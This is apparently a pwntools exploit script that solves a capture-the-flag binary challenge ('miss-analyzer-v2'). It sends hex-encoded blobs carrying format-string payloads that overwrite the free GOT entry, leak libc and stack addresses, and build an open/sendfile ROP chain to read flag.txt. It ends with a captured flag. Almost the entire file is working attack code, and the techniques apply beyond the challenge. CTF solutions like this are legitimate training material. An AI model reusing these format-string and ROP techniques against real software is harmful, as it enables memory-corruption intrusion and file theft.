#!/usr/bin/env python3
from pwn import *
import binascii

exe = ELF("./analyzer_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

HOST="miss-analyzer-v2.challs.sekai.team"
PORT=1337

context.binary = exe
context.log_level = 'debug'

gdbscript="""
b*0x401ADA
b*main+1185
c"""

def run():
    if args.LOCAL:
        p = process([exe.path])
        gdb.attach(p, api=True, gdbscript=gdbscript)
    else:
        p = remote(HOST, PORT)

    return p

p = run()
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
sn = lambda data: p.sendline(str(data).encode())
s = lambda data: p.send(data)
ru = lambda msg: p.recvuntil(msg)
rl = lambda: p.recvline().strip()
rn = lambda n: p.recvn(n)

def enc_varint7(n: int) -> bytes:
    out = bytearray()
    while True:
        b = n & 0x7f
        n >>= 7
        out.append(b | (0x80 if n else 0))
        if not n: break
    return bytes(out)

writes = {
    exe.got['free']: exe.symbols['main'],
    0x404100 : b"flag.txt\x00"
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob))

fmt = (b'|' + b'%p' + b'\n'  ) * 0x40
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob))

for _ in range(3):
    p.recvuntil(b'|')

leak = int(p.recvline().strip(),16)

libc.address = leak - libc.symbols['write'] - 23
success("libc "+ f"{hex(libc.address)}")

for _ in range(3):
    p.recvuntil(b'|')

leak = int(p.recvline().strip(),16)
v12 = leak + 0x290 + 0x23b0 - 0x1b20
info("v12 "+ f"{hex(v12)}")

for _ in range(46):
    p.recvuntil(b'|')

stack = int(p.recvline().strip(),16)
info("stack "+ f"{hex(stack)}")

pop_rdi = libc.address + 0x000000000002a3e5
pop_rsi = libc.address + 0x000000000002be51
pop_rdx_r12 = libc.address + 0x000000000011f357
pop_rcx = libc.address + 0x000000000003d1ee
open = libc.symbols['open']
sendfile = libc.symbols['sendfile']
free = libc.symbols['free']
sendfile = libc.symbols['sendfile']


setcontext = libc.symbols['setcontext']
target = stack - 0x178
info("target "+ f"{hex(target)}")

writes = {
    target : pop_rdi,
    target + 0x8 : 0x404100,
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob))
info("stage 1")              

writes = {
    target + 0x18 : 0x0,
    target + 0x10 : pop_rsi,
    target + 0x20 : open,
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob)) 
info("stage 2")

writes = {
    target + 0x20 : open,
    target + 0x28 : pop_rsi,
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob)) 
info("stage 3")

writes = {
    target + 0x50 : 0x1,
    target + 0x30 : 0x3,
    target + 0x40 : 0x30,
    target + 0x38 : pop_rcx,
    target + 0x48 : pop_rdi,
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob)) 
info("stage 4")

writes = {
    target + 0x58 : sendfile,
    exe.got['free']: 0x401030,
}
fmt = fmtstr_payload(16, writes)     
blob  = b'\x41'*5                   
blob += b'\x0b' + enc_varint7(0)       
blob += b'\x0b' + enc_varint7(len(fmt)) + fmt  
blob += b'\x0b' + enc_varint7(0)  
blob += b'\x00'*10                  
blob += b'\x00\x00'              

p.sendlineafter(b'/analyzer):', binascii.hexlify(blob)) 
info("stage 3")

p.interactive()

#osu{fmtstr_in_the_b1g_2025}